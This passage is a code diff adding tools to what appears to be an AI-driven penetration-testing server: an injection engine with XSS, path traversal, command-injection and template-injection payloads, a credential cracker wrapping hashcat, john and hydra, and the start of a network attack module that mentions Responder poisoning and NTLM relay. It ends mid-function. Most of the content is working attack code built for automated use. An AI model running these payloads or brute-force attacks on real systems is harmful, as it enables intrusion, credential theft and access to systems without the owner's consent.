+                                                sourcemap_findings["secrets"].append({"type": stype, "value": str(m)[:100]})
+                            except json.JSONDecodeError:
+                                pass
+
+            results["modules"]["sourcemaps"] = sourcemap_findings
+            if sourcemap_findings["maps_found"]:
+                pentest_memory.store_finding(target, "web_assault", "source_maps",
+                                             {"maps": sourcemap_findings["maps_found"],
+                                              "secrets": len(sourcemap_findings["secrets"])})
+
+        # --- CONTEXT-AWARE FUZZING ---
+        if "fuzz" in mod_list:
+            fuzz_results = {"tests": []}
+            # Test for common sensitive files
+            sensitive_files = [
+                "/.env", "/.git/config", "/.git/HEAD", "/robots.txt", "/sitemap.xml",
+                "/.htaccess", "/web.config", "/crossdomain.xml", "/clientaccesspolicy.xml",
+                "/wp-config.php.bak", "/config.php.bak", "/.DS_Store", "/thumbs.db",
+                "/.svn/entries", "/backup.zip", "/backup.tar.gz", "/dump.sql",
+                "/api/swagger.json", "/api/v1/docs", "/openapi.json",
+            ]
+            for f in sensitive_files:
+                check = await run_command(
+                    ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}|%{size_download}",
+                     f"{target}{f}"],
+                    timeout=8,
+                )
+                if check.get("stdout"):
+                    parts = check["stdout"].strip().split("|")
+                    status = int(parts[0]) if parts[0].isdigit() else 0
+                    size = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
+                    if status in [200, 301, 302, 403] and size > 0:
+                        fuzz_results["tests"].append({
+                            "path": f, "status": status, "size": size,
+                            "interesting": status == 200 and size > 10,
+                        })
+                await asyncio.sleep(delay)
+            results["modules"]["fuzz"] = fuzz_results
+
+        results["recommendations"] = orchestrator.recommend_next_tools(target)
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 3: INJECTION MATRIX
+# Replaces: sqlmap_scan, sql_injection_test, xss_scan, lfi_scan, command_injection_test,
+#           ssti_scanner, json_parameter_fuzzer
+# ============================================================================
+
+@mcp.tool()
+async def injection_matrix(
+    target: str,
+    depth: str = "deep",
+    modules: str = "all",
+    param: Optional[str] = None,
+    method: str = "GET",
+    data: Optional[str] = None,
+    timeout: int = 600,
+) -> str:
+    """
+    Unified injection testing engine. Combines: SQLi (sqlmap+manual), XSS, LFI/RFI,
+    command injection, SSTI, JSON parameter fuzzing, type confusion, mass assignment.
+
+    depth: stealth|light|deep|aggressive
+    modules: all | comma-separated: sqli,xss,lfi,cmdi,ssti,json_fuzz
+    """
+    target = InputValidator.sanitize_target(target)
+    timeout = InputValidator.validate_timeout(timeout)
+    execution = session_manager.start_execution("injection_matrix", target, {"depth": depth, "modules": modules})
+    results = {"target": target, "depth": depth, "modules": {}}
+
+    try:
+        mod_list = modules.split(",") if modules != "all" else ["sqli", "xss", "lfi", "cmdi", "ssti", "json_fuzz"]
+        delay = rate_limit_detector.get_delay(target)
+
+        # --- SQL INJECTION ---
+        if "sqli" in mod_list:
+            sqli_results = {"sqlmap": {}, "manual_tests": []}
+            sqlmap_args = ["sqlmap", "-u", target, "--batch", "--random-agent"]
+            if param:
+                sqlmap_args.extend(["-p", param])
+            if data:
+                sqlmap_args.extend(["--data", data])
+            if depth == "stealth":
+                sqlmap_args.extend(["--level", "1", "--risk", "1"])
+            elif depth == "light":
+                sqlmap_args.extend(["--level", "2", "--risk", "1"])
+            elif depth == "deep":
+                sqlmap_args.extend(["--level", "3", "--risk", "2", "--threads", "4"])
+            elif depth == "aggressive":
+                sqlmap_args.extend(["--level", "5", "--risk", "3", "--threads", "8",
+                                    "--tamper", "between,randomcase,space2comment"])
+            sqlmap_result = await run_command(sqlmap_args, timeout=timeout)
+            sqli_results["sqlmap"]["output"] = sqlmap_result.get("stdout", "")[:3000]
+            sqli_results["sqlmap"]["vulnerable"] = any(
+                marker in sqlmap_result.get("stdout", "").lower()
+                for marker in ["injectable", "payload:", "parameter:", "type:"]
+            )
+            if sqli_results["sqlmap"]["vulnerable"]:
+                pentest_memory.store_finding(target, "injection_matrix", "sqli_found",
+                                             {"source": "sqlmap", "param": param})
+                s, v, sev = CVSSCalculator.score_for_vuln_type("sqli")
+                vuln_correlator.add_vulnerability(VulnFinding(
+                    vuln_id=f"sqli_{param}", title=f"SQL Injection via param '{param}'",
+                    severity=sev, cvss_score=s, cvss_vector=v, target=target, port=443,
+                    service="http", evidence=f"sqlmap confirmed injectable param: {param}",
+                    exploitable=True, kill_chain_phase="exploitation",
+                    mitre_techniques=["T1190"], remediation="Use parameterized queries / prepared statements",
+                ))
+                kill_chain.advance_phase(target, KillChainPhase.EXPLOITATION, "injection_matrix", [f"sqli:{param}"])
+            results["modules"]["sqli"] = sqli_results
+
+        # --- XSS ---
+        if "xss" in mod_list:
+            xss_results = {"reflected": [], "dom_based": []}
+            xss_payloads = [
+                '<script>alert(1)</script>',
+                '"><img src=x onerror=alert(1)>',
+                "'-alert(1)-'",
+                '{{7*7}}',
+                '${7*7}',
+                '<svg onload=alert(1)>',
+                'javascript:alert(1)',
+                '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
+            ]
+            if depth in ["deep", "aggressive"]:
+                xss_payloads.extend([
+                    '<details open ontoggle=alert(1)>',
+                    '<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d="M0,0"/><animate attributeName=d values="M0,0">',
+                    '"><svg><animatetransform onbegin=alert(1)>',
+                    'data:text/html,<script>alert(1)</script>',
+                ])
+            for payload in xss_payloads:
+                encoded = urllib.parse.quote(payload)
+                test_url = f"{target}{'&' if '?' in target else '?'}{param or 'q'}={encoded}"
+                result = await run_command(["curl", "-sk", test_url], timeout=10)
+                if result.get("stdout") and payload in result["stdout"]:
+                    xss_results["reflected"].append({
+                        "payload": payload,
+                        "param": param or "q",
+                        "reflected": True,
+                    })
+                await asyncio.sleep(delay)
+            results["modules"]["xss"] = xss_results
+            if xss_results["reflected"]:
+                pentest_memory.store_finding(target, "injection_matrix", "xss_found",
+                                             {"count": len(xss_results["reflected"])})
+                s, v, sev = CVSSCalculator.score_for_vuln_type("xss_reflected")
+                vuln_correlator.add_vulnerability(VulnFinding(
+                    vuln_id=f"xss_reflected_{len(xss_results['reflected'])}",
+                    title=f"Reflected XSS ({len(xss_results['reflected'])} vectors)",
+                    severity=sev, cvss_score=s, cvss_vector=v, target=target,
+                    service="http", evidence=str(xss_results["reflected"][:2]),
+                    exploitable=True, kill_chain_phase="delivery",
+                    mitre_techniques=["T1189"], remediation="Encode output, implement CSP",
+                ))
+
+        # --- LFI / PATH TRAVERSAL ---
+        if "lfi" in mod_list:
+            lfi_results = {"vulnerabilities": []}
+            lfi_payloads = [
+                ("../../../etc/passwd", "root:"),
+                ("....//....//....//etc/passwd", "root:"),
+                ("..%2f..%2f..%2fetc%2fpasswd", "root:"),
+                ("..%252f..%252f..%252fetc%252fpasswd", "root:"),
+                ("/etc/passwd", "root:"),
+                ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd"),
+                ("file:///etc/passwd", "root:"),
+                ("....\\....\\....\\windows\\system32\\drivers\\etc\\hosts", "localhost"),
+            ]
+            if depth in ["deep", "aggressive"]:
+                lfi_payloads.extend([
+                    ("/proc/self/environ", "PATH="),
+                    ("/proc/self/cmdline", ""),
+                    ("php://input", ""),
+                    ("expect://id", "uid="),
+                    ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+", "phpinfo"),
+                ])
+            for payload, marker in lfi_payloads:
+                encoded = urllib.parse.quote(payload)
+                test_url = f"{target}{'&' if '?' in target else '?'}{param or 'file'}={encoded}"
+                result = await run_command(["curl", "-sk", test_url], timeout=10)
+                if result.get("stdout") and marker and marker in result["stdout"]:
+                    lfi_results["vulnerabilities"].append({
+                        "payload": payload,
+                        "marker_found": marker,
+                        "severity": "critical",
+                    })
+                await asyncio.sleep(delay)
+            results["modules"]["lfi"] = lfi_results
+            if lfi_results["vulnerabilities"]:
+                pentest_memory.store_finding(target, "injection_matrix", "lfi_found",
+                                             {"count": len(lfi_results["vulnerabilities"])})
+                s, v, sev = CVSSCalculator.score_for_vuln_type("lfi")
+                vuln_correlator.add_vulnerability(VulnFinding(
+                    vuln_id=f"lfi_{len(lfi_results['vulnerabilities'])}",
+                    title=f"Local File Inclusion ({len(lfi_results['vulnerabilities'])} vectors)",
+                    severity=sev, cvss_score=s, cvss_vector=v, target=target,
+                    service="http", exploitable=True, kill_chain_phase="exploitation",
+                    mitre_techniques=["T1005", "T1083"],
+                    remediation="Validate/whitelist file paths, disable remote includes",
+                ))
+
+        # --- COMMAND INJECTION ---
+        if "cmdi" in mod_list:
+            cmdi_results = {"vulnerabilities": []}
+            sleep_payloads = [
+                ("; sleep 5", 5), ("| sleep 5", 5), ("$(sleep 5)", 5),
+                ("`sleep 5`", 5), ("\n sleep 5", 5), ("& sleep 5 &", 5),
+                ("%0asleep 5", 5), ("|| sleep 5", 5),
+            ]
+            for payload, expected_delay in sleep_payloads:
+                encoded = urllib.parse.quote(payload)
+                test_url = f"{target}{'&' if '?' in target else '?'}{param or 'cmd'}={encoded}"
+                start = time.time()
+                result = await run_command(["curl", "-sk", "--max-time", "12", test_url], timeout=15)
+                elapsed = time.time() - start
+                if elapsed >= expected_delay - 1:
+                    cmdi_results["vulnerabilities"].append({
+                        "payload": payload,
+                        "time_based": True,
+                        "delay_observed": round(elapsed, 2),
+                        "severity": "critical",
+                    })
+                await asyncio.sleep(delay)
+            results["modules"]["cmdi"] = cmdi_results
+            if cmdi_results["vulnerabilities"]:
+                pentest_memory.store_finding(target, "injection_matrix", "cmdi_found",
+                                             {"count": len(cmdi_results["vulnerabilities"])})
+                s, v, sev = CVSSCalculator.score_for_vuln_type("cmdi")
+                vuln_correlator.add_vulnerability(VulnFinding(
+                    vuln_id=f"cmdi_{len(cmdi_results['vulnerabilities'])}",
+                    title=f"Command Injection ({len(cmdi_results['vulnerabilities'])} vectors)",
+                    severity=sev, cvss_score=s, cvss_vector=v, target=target,
+                    service="http", exploitable=True, kill_chain_phase="exploitation",
+                    mitre_techniques=["T1059.004"],
+                    remediation="Never pass user input to shell commands; use parameterized APIs",
+                ))
+
+        # --- SSTI ---
+        if "ssti" in mod_list:
+            ssti_results = {"vulnerabilities": [], "engine_detected": None}
+            ssti_payloads = [
+                ("{{7*7}}", "49", "jinja2/twig"),
+                ("${7*7}", "49", "freemarker/el"),
+                ("#{7*7}", "49", "ruby_erb/thymeleaf"),
+                ("<%= 7*7 %>", "49", "erb"),
+                ("{{constructor.constructor('return 7*7')()}}", "49", "angular/vue"),
+                ("${T(java.lang.Runtime).getRuntime().exec('id')}", "uid=", "spring_el"),
+                ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "uid=", "twig"),
+            ]
+            for payload, marker, engine in ssti_payloads:
+                encoded = urllib.parse.quote(payload)
+                test_url = f"{target}{'&' if '?' in target else '?'}{param or 'name'}={encoded}"
+                result = await run_command(["curl", "-sk", test_url], timeout=10)
+                if result.get("stdout") and marker in result["stdout"]:
+                    ssti_results["vulnerabilities"].append({
+                        "payload": payload,
+                        "engine": engine,
+                        "severity": "critical",
+                    })
+                    ssti_results["engine_detected"] = engine
+                await asyncio.sleep(delay)
+            results["modules"]["ssti"] = ssti_results
+            if ssti_results["vulnerabilities"]:
+                pentest_memory.store_finding(target, "injection_matrix", "ssti_found",
+                                             {"engine": ssti_results["engine_detected"]})
+                s, v, sev = CVSSCalculator.score_for_vuln_type("ssti")
+                vuln_correlator.add_vulnerability(VulnFinding(
+                    vuln_id=f"ssti_{ssti_results.get('engine_detected', 'unknown')}",
+                    title=f"SSTI ({ssti_results.get('engine_detected', 'unknown')} engine)",
+                    severity=sev, cvss_score=s, cvss_vector=v, target=target,
+                    service="http", exploitable=True, kill_chain_phase="exploitation",
+                    mitre_techniques=["T1190", "T1059"],
+                    remediation="Use sandboxed template engines; never pass user input to templates",
+                ))
+
+        # --- JSON PARAMETER FUZZING ---
+        if "json_fuzz" in mod_list:
+            json_fuzz_results = {"hidden_params": [], "type_confusion": [], "mass_assignment": []}
+            # Common hidden parameter names
+            hidden_params = [
+                "admin", "role", "is_admin", "isAdmin", "debug", "test", "internal",
+                "privilege", "level", "access", "token", "secret", "key", "password",
+                "user_id", "userId", "account_id", "email", "username", "status",
+                "verified", "active", "enabled", "permissions", "group", "type",
+            ]
+            # Try POST with JSON body to discover params
+            for param_name in hidden_params:
+                for test_val in [True, "admin", 1, "1"]:
+                    body = json.dumps({param_name: test_val})
+                    result = await run_command([
+                        "curl", "-sk", "-X", "POST", target,
+                        "-H", "Content-Type: application/json",
+                        "-d", body, "-o", "/dev/null",
+                        "-w", "%{http_code}|%{size_download}",
+                    ], timeout=8)
+                    if result.get("stdout"):
+                        parts_resp = result["stdout"].strip().split("|")
+                        status = int(parts_resp[0]) if parts_resp[0].isdigit() else 0
+                        if status in [200, 201, 422]:
+                            json_fuzz_results["hidden_params"].append({
+                                "param": param_name, "value": test_val,
+                                "status": status, "interesting": status != 422,
+                            })
+                            break
+                await asyncio.sleep(delay * 0.5)
+
+            # Type confusion tests
+            type_tests = [
+                ({"id": "1"}, {"id": 1}),
+                ({"id": "1"}, {"id": [1]}),
+                ({"id": "1"}, {"id": {"$gt": 0}}),
+                ({"admin": "false"}, {"admin": True}),
+                ({"price": "100"}, {"price": -1}),
+                ({"quantity": "1"}, {"quantity": 999999}),
+            ]
+            for normal, confused in type_tests:
+                r1 = await run_command([
+                    "curl", "-sk", "-X", "POST", target,
+                    "-H", "Content-Type: application/json",
+                    "-d", json.dumps(normal),
+                    "-w", "\n%{http_code}|%{size_download}",
+                ], timeout=8)
+                r2 = await run_command([
+                    "curl", "-sk", "-X", "POST", target,
+                    "-H", "Content-Type: application/json",
+                    "-d", json.dumps(confused),
+                    "-w", "\n%{http_code}|%{size_download}",
+                ], timeout=8)
+                if r1.get("stdout") and r2.get("stdout"):
+                    s1 = r1["stdout"].split("\n")[-1]
+                    s2 = r2["stdout"].split("\n")[-1]
+                    if s1 != s2:
+                        json_fuzz_results["type_confusion"].append({
+                            "normal": normal, "confused": confused,
+                            "response_diff": True,
+                        })
+
+            results["modules"]["json_fuzz"] = json_fuzz_results
+
+        results["recommendations"] = orchestrator.recommend_next_tools(target)
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 4: CREDENTIAL CRACKER
+# Replaces: hydra_attack, john_crack + NEW: hashcat, mask, markov, entropy analysis
+# ============================================================================
+
+@mcp.tool()
+async def credential_cracker(
+    target: str,
+    service: str = "auto",
+    hash_value: Optional[str] = None,
+    hash_file: Optional[str] = None,
+    hash_type: Optional[str] = None,
+    wordlist: str = "auto",
+    technique: str = "auto",
+    username: Optional[str] = None,
+    userlist: Optional[str] = None,
+    entropy_limit: int = 60,
+    timeout: int = 600,
+) -> str:
+    """
+    Unified credential cracking engine. Auto-selects: hydra (online), john/hashcat (offline).
+    Supports: dictionary, mask, markov, hybrid, prince, rule-based attacks.
+    Entropy estimation to predict crackability. GPU-optimized hashcat when available.
+
+    service: auto|ssh|ftp|http|smb|rdp|mysql|mssql|vnc|telnet|smtp|pop3|wpa
+    technique: auto|dictionary|mask|markov|hybrid|prince|rules
+    """
+    target = InputValidator.sanitize_target(target)
+    timeout = InputValidator.validate_timeout(timeout)
+    execution = session_manager.start_execution("credential_cracker", target,
+                                                 {"service": service, "technique": technique})
+    results = {"target": target, "service": service, "attacks": {}}
+
+    try:
+        # --- HASH ANALYSIS & ENTROPY ESTIMATION ---
+        if hash_value or hash_file:
+            hash_analysis = {"hash_type": "unknown", "estimated_entropy": 0,
+                             "crackable": False, "estimated_time": "unknown"}
+
+            test_hash = hash_value or ""
+            if hash_file and os.path.exists(hash_file):
+                with open(hash_file) as f:
+                    test_hash = f.readline().strip()
+
+            # Hash type identification
+            hash_types = {
+                32: [("md5", "0"), ("ntlm", "1000")],
+                40: [("sha1", "100")],
+                56: [("sha224", "1300")],
+                64: [("sha256", "1400"), ("sha3-256", "17400")],
+                96: [("sha384", "10800")],
+                128: [("sha512", "1700")],
+            }
+            hash_clean = test_hash.split(":")[-1] if ":" in test_hash else test_hash
+            hash_len = len(hash_clean)
+
+            if hash_clean.startswith("$2"):
+                hash_analysis["hash_type"] = "bcrypt"
+                hash_analysis["hashcat_mode"] = "3200"
+                hash_analysis["estimated_entropy"] = 72
+            elif hash_clean.startswith("$6$"):
+                hash_analysis["hash_type"] = "sha512crypt"
+                hash_analysis["hashcat_mode"] = "1800"
+                hash_analysis["estimated_entropy"] = 65
+            elif hash_clean.startswith("$5$"):
+                hash_analysis["hash_type"] = "sha256crypt"
+                hash_analysis["hashcat_mode"] = "7400"
+                hash_analysis["estimated_entropy"] = 60
+            elif hash_clean.startswith("$1$"):
+                hash_analysis["hash_type"] = "md5crypt"
+                hash_analysis["hashcat_mode"] = "500"
+                hash_analysis["estimated_entropy"] = 40
+            elif hash_clean.startswith("$apr1$"):
+                hash_analysis["hash_type"] = "apr1"
+                hash_analysis["hashcat_mode"] = "1600"
+            elif hash_len in hash_types:
+                candidates = hash_types[hash_len]
+                hash_analysis["hash_type"] = candidates[0][0]
+                hash_analysis["hashcat_mode"] = candidates[0][1]
+                if hash_analysis["hash_type"] in ["md5", "ntlm"]:
+                    hash_analysis["estimated_entropy"] = 30
+                elif hash_analysis["hash_type"] in ["sha1", "sha256"]:
+                    hash_analysis["estimated_entropy"] = 40
+
+            # Crackability assessment
+            hash_analysis["crackable"] = hash_analysis["estimated_entropy"] <= entropy_limit
+            # Time estimation based on hash type speed
+            speed_table = {
+                "md5": 60_000_000_000, "ntlm": 100_000_000_000,
+                "sha1": 20_000_000_000, "sha256": 8_000_000_000,
+                "bcrypt": 30_000, "sha512crypt": 1_000_000,
+            }
+            speed = speed_table.get(hash_analysis["hash_type"], 1_000_000)
+            keyspace = 2 ** hash_analysis["estimated_entropy"]
+            seconds = keyspace / speed
+            if seconds < 60:
+                hash_analysis["estimated_time"] = f"{seconds:.1f} seconds"
+            elif seconds < 3600:
+                hash_analysis["estimated_time"] = f"{seconds/60:.1f} minutes"
+            elif seconds < 86400:
+                hash_analysis["estimated_time"] = f"{seconds/3600:.1f} hours"
+            elif seconds < 86400 * 365:
+                hash_analysis["estimated_time"] = f"{seconds/86400:.1f} days"
+            else:
+                hash_analysis["estimated_time"] = f"{seconds/(86400*365):.1f} years"
+
+            results["hash_analysis"] = hash_analysis
+
+            # --- OFFLINE CRACKING (hashcat preferred, fallback john) ---
+            if hash_analysis["crackable"]:
+                # Select wordlist
+                wl_paths = {
+                    "auto": "/usr/share/wordlists/rockyou.txt",
+                    "small": "/usr/share/wordlists/dirb/small.txt",
+                    "common": "/usr/share/wordlists/dirb/common.txt",
+                    "rockyou": "/usr/share/wordlists/rockyou.txt",
+                }
+                wl = wl_paths.get(wordlist, wordlist)
+
+                # Generate target-specific wordlist additions
+                target_words = []
+                hostname = target.split("://")[-1].split("/")[0].split(":")[0]
+                parts_host = hostname.replace(".", " ").replace("-", " ").split()
+                for word in parts_host:
+                    target_words.extend([
+                        word, word.capitalize(), word.upper(),
+                        word + "123", word + "2024", word + "2025",
+                        word + "!", word + "@123",
+                    ])
+
+                if technique == "auto" or technique == "dictionary":
+                    # Try hashcat first
+                    hc_mode = hash_analysis.get("hashcat_mode", "0")
+                    if hash_file:
+                        hashcat_args = [
+                            "hashcat", "-m", hc_mode, hash_file, wl,
+                            "--force", "-O", "--runtime", str(min(timeout, 300)),
+                        ]
+                    elif hash_value:
+                        tmp_hash = tempfile.NamedTemporaryFile(mode="w", suffix=".hash", delete=False)
+                        tmp_hash.write(hash_value + "\n")
+                        tmp_hash.close()
+                        hashcat_args = [
+                            "hashcat", "-m", hc_mode, tmp_hash.name, wl,
+                            "--force", "-O", "--runtime", str(min(timeout, 300)),
+                        ]
+                    else:
+                        hashcat_args = []
+
+                    if hashcat_args:
+                        hc_result = await run_command(hashcat_args, timeout=timeout)
+                        results["attacks"]["hashcat_dictionary"] = {
+                            "output": hc_result.get("stdout", "")[:2000],
+                            "success": hc_result.get("success", False),
+                        }
+                        # Parse cracked passwords
+                        if "Cracked" in hc_result.get("stdout", ""):
+                            results["attacks"]["hashcat_dictionary"]["cracked"] = True
+                            pentest_memory.store_finding(target, "credential_cracker", "credentials",
+                                                         {"source": "hashcat", "method": "dictionary"})
+                            # Extract cracked creds + register
+                            cracked_creds = deep_parser.extract_credentials_from_output(hc_result.get("stdout", ""))
+                            results["attacks"]["hashcat_dictionary"]["cracked_credentials"] = cracked_creds
+                            s, v, sev = CVSSCalculator.score_for_vuln_type("default_credentials")
+                            vuln_correlator.add_vulnerability(VulnFinding(
+                                vuln_id="cracked_hash", title="Hash cracked via dictionary attack",
+                                severity=sev, cvss_score=s, cvss_vector=v, target=target,
+                                exploitable=True, kill_chain_phase="exploitation",
+                                mitre_techniques=["T1110.002"],
+                                remediation="Enforce strong password policy (min 12 chars, complexity)",
+                            ))
+                            kill_chain.advance_phase(target, KillChainPhase.EXPLOITATION,
+                                                      "credential_cracker", ["hash_cracked:dictionary"])
+
+                if technique in ["auto", "mask"]:
+                    # Mask attack - common password patterns
+                    masks = [
+                        "?u?l?l?l?d?d?d?d",      # Password1234
+                        "?u?l?l?l?l?l?d?d",      # Summer23
+                        "?u?l?l?l?l?l?l?d?d?s",  # Welcome1!
+                        "?d?d?d?d?d?d",           # 123456
+                        "?l?l?l?l?l?l?l?l",       # abcdefgh
+                        "?u?l?l?l?l?l?d?d?d?s",  # Spring123!
+                    ]
+                    for mask in masks[:3]:
+                        mask_args = ["hashcat", "-m", hash_analysis.get("hashcat_mode", "0"),
+                                     "-a", "3", hash_file or tmp_hash.name if hash_value else "",
+                                     mask, "--force", "-O", "--runtime", "60"]
+                        if mask_args[-4]:  # hash file exists
+                            mask_result = await run_command(mask_args, timeout=120)
+                            if "Cracked" in mask_result.get("stdout", ""):
+                                results["attacks"]["hashcat_mask"] = {"cracked": True, "mask": mask}
+                                break
+
+                if technique in ["auto", "rules"]:
+                    # Rule-based attack
+                    rules_file = "/usr/share/hashcat/rules/best64.rule"
+                    if os.path.exists(rules_file) and (hash_file or hash_value):
+                        rule_args = [
+                            "hashcat", "-m", hash_analysis.get("hashcat_mode", "0"),
+                            hash_file or (tmp_hash.name if hash_value else ""),
+                            wl, "-r", rules_file,
+                            "--force", "-O", "--runtime", str(min(timeout // 3, 120)),
+                        ]
+                        rule_result = await run_command(rule_args, timeout=timeout // 2)
+                        results["attacks"]["hashcat_rules"] = {
+                            "output": rule_result.get("stdout", "")[:1000],
+                            "success": rule_result.get("success", False),
+                        }
+
+                # Fallback: john
+                john_args = ["john"]
+                if hash_file:
+                    john_args.append(hash_file)
+                elif hash_value:
+                    tmp_j = tempfile.NamedTemporaryFile(mode="w", suffix=".hash", delete=False)
+                    tmp_j.write(hash_value + "\n")
+                    tmp_j.close()
+                    john_args.append(tmp_j.name)
+                if wl and os.path.exists(wl):
+                    john_args.extend(["--wordlist=" + wl])
+                john_result = await run_command(john_args, timeout=min(timeout, 300))
+                results["attacks"]["john"] = {
+                    "output": john_result.get("stdout", "")[:2000],
+                    "success": john_result.get("success", False),
+                }
+
+        # --- ONLINE BRUTE FORCE (hydra) ---
+        elif service != "none":
+            detected_service = service
+            if service == "auto":
+                # Auto-detect from memory or port scan
+                context = pentest_memory.get_context(target)
+                port_findings = pentest_memory.get_findings(target, "open_ports")
+                if port_findings:
+                    ports_data = port_findings[-1].get("data", {})
+                    for svc in ports_data.get("services", []):
+                        svc_name = svc.get("service", "").lower()
+                        if "ssh" in svc_name:
+                            detected_service = "ssh"
+                            break
+                        elif "ftp" in svc_name:
+                            detected_service = "ftp"
+                            break
+                        elif "http" in svc_name:
+                            detected_service = "http-get"
+                            break
+                        elif "smb" in svc_name or "microsoft-ds" in svc_name:
+                            detected_service = "smb"
+                            break
+                if detected_service == "auto":
+                    detected_service = "ssh"
+
+            wl = "/usr/share/wordlists/rockyou.txt" if wordlist == "auto" else wordlist
+            hydra_args = ["hydra", "-f", "-V"]
+            if username:
+                hydra_args.extend(["-l", username])
+            elif userlist:
+                hydra_args.extend(["-L", userlist])
+            else:
+                hydra_args.extend(["-l", "admin"])
+            hydra_args.extend(["-P", wl, target, detected_service])
+            hydra_result = await run_command(hydra_args, timeout=timeout)
+            results["attacks"]["hydra"] = {
+                "service": detected_service,
+                "output": hydra_result.get("stdout", "")[:3000],
+                "success": hydra_result.get("success", False),
+            }
+            # Parse found credentials
+            if hydra_result.get("stdout"):
+                cred_matches = re.findall(
+                    r"\[(\d+)\]\[(\w+)\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(\S+)",
+                    hydra_result["stdout"],
+                )
+                if cred_matches:
+                    results["attacks"]["hydra"]["credentials_found"] = [
+                        {"port": m[0], "service": m[1], "host": m[2], "login": m[3], "password": m[4]}
+                        for m in cred_matches
+                    ]
+                    pentest_memory.store_finding(target, "credential_cracker", "credentials",
+                                                 {"source": "hydra", "count": len(cred_matches)})
+                    s, v, sev = CVSSCalculator.score_for_vuln_type("default_credentials")
+                    vuln_correlator.add_vulnerability(VulnFinding(
+                        vuln_id=f"hydra_creds_{detected_service}",
+                        title=f"Weak credentials on {detected_service} ({len(cred_matches)} found)",
+                        severity=sev, cvss_score=s, cvss_vector=v, target=target,
+                        port=int(cred_matches[0][0]) if cred_matches else 0,
+                        service=detected_service, exploitable=True,
+                        kill_chain_phase="exploitation",
+                        mitre_techniques=["T1110.001"],
+                        remediation="Enforce strong passwords, implement account lockout, use MFA",
+                    ))
+                    kill_chain.advance_phase(target, KillChainPhase.EXPLOITATION,
+                                              "credential_cracker",
+                                              [f"hydra:{detected_service}:{len(cred_matches)}_creds"])
+
+        # Intelligence: correlation + kill chain state
+        results["correlation"] = vuln_correlator.correlate(target)
+        results["kill_chain"] = kill_chain.get_progress(target)
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 5: NETWORK DOMINATOR
+# Replaces: arp_scan, advanced_arp_discovery, enum4linux_scan, advanced_smb_enum
+# NEW: bettercap, responder, NTLM relay, impacket integration
+# ============================================================================
+
+@mcp.tool()
+async def network_dominator(
+    target: str,
+    depth: str = "deep",
+    modules: str = "all",
+    interface: Optional[str] = None,
+    timeout: int = 600,
+) -> str:
+    """
+    Unified network attack engine. Combines: ARP discovery, SMB enumeration,
+    bettercap MitM, Responder LLMNR/NBNS poisoning, NTLM relay, impacket tools.
+
+    depth: stealth|light|deep|aggressive
+    modules: all | comma-separated: arp,smb,bettercap,responder,ntlm_relay,impacket
+    """
+    target = InputValidator.sanitize_target(target)
+    timeout = InputValidator.validate_timeout(timeout)
+    execution = session_manager.start_execution("network_dominator", target,
+                                                 {"depth": depth, "modules": modules})
+    results = {"target": target, "depth": depth, "modules": {}}
+
+    try:
+        mod_list = modules.split(",") if modules != "all" else ["arp", "smb", "bettercap", "responder", "impacket"]
+
+        # --- ARP DISCOVERY ---
+        if "arp" in mod_list:
+            arp_results = {"hosts": []}
+            # arp-scan
+            arp_args = ["arp-scan"]
+            if interface:
+                arp_args.extend(["-I", interface])
+            arp_args.append(target if "/" in target else f"{target}/24")
+            arp_result = await run_command(arp_args, timeout=60)
+            if arp_result.get("stdout"):
+                for line in arp_result["stdout"].split("\n"):
+                    match = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+(\S+)\s+(.*)", line)
+                    if match:
+                        arp_results["hosts"].append({
+                            "ip": match.group(1),
+                            "mac": match.group(2),
+                            "vendor": match.group(3).strip(),
+                        })
+            # nmap host discovery as fallback
+            nmap_ping = await run_command(
+                ["nmap", "-sn", "-oX", "-", target if "/" in target else f"{target}/24"],
+                timeout=60,
+            )
+            if nmap_ping.get("stdout"):
+                try:
+                    root = ET.fromstring(nmap_ping["stdout"])
+                    for host in root.findall(".//host"):
+                        addr = host.find(".//address[@addrtype='ipv4']")
+                        if addr is not None:
+                            ip = addr.get("addr")
+                            if not any(h["ip"] == ip for h in arp_results["hosts"]):
+                                arp_results["hosts"].append({"ip": ip, "mac": "", "vendor": ""})
+                except ET.ParseError:
+                    pass
+            results["modules"]["arp"] = arp_results
+            pentest_memory.store_finding(target, "network_dominator", "live_hosts",
+                                         {"count": len(arp_results["hosts"])})
+
+        # --- SMB ENUMERATION ---
+        if "smb" in mod_list:
+            smb_results = {"shares": [], "users": [], "os_info": ""}
+            # enum4linux
+            e4l_result = await run_command(["enum4linux", "-a", target], timeout=120)
+            if e4l_result.get("stdout"):
+                out = e4l_result["stdout"]
+                # Parse shares
+                share_matches = re.findall(r"//\S+/(\S+)\s+\w+\s+(.*)", out)
+                for name, comment in share_matches:
+                    smb_results["shares"].append({"name": name, "comment": comment.strip()})
+                # Parse users
+                user_matches = re.findall(r"user:\[(\S+?)\]", out)
+                smb_results["users"] = list(set(user_matches))
+                # OS info
+                os_match = re.search(r"OS information on (\S+).*?:\s*(.*?)(?:\n|$)", out)
+                if os_match:
+                    smb_results["os_info"] = os_match.group(2).strip()
+
+            # smbclient listing
+            smb_list = await run_command(
+                ["smbclient", "-L", target, "-N", "--option", "client min protocol=SMB2"],
+                timeout=30,
+            )
+            if smb_list.get("stdout"):
+                for line in smb_list["stdout"].split("\n"):
